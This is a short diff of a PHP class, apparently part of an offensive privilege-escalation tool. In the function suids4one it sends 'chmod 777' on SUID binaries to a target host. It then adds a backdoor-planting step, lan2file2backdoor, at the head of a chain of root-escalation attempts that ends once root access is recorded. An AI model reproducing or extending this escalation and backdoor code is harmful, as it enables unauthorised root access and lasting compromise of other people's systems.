@@ -77,6 +77,8 @@ Many times, we do want to see if there are any files owned by those users outsid
         $this->suids4all($tab_suid);
     }
     
+
+    
     
     public function suids4one($suid){
         $this->titre(__FUNCTION__);
@@ -84,6 +86,7 @@ Many times, we do want to see if there are any files owned by those users outsid
             $data = "chmod 777 $suid";
             $this->lan2stream4result($data,$this->stream_timeout);
             $this->pause();                       
+            if (!$this->ip2root8db($this->ip2id)) $this->lan2file2backdoor($suid);
             if (!$this->ip2root8db($this->ip2id)) $this->lan2root8bin($suid,FALSE,"");
             if (!$this->ip2root8db($this->ip2id))  $this->suids8env($suid);
             if (!$this->ip2root8db($this->ip2id))  $this->suids8app($suid);           
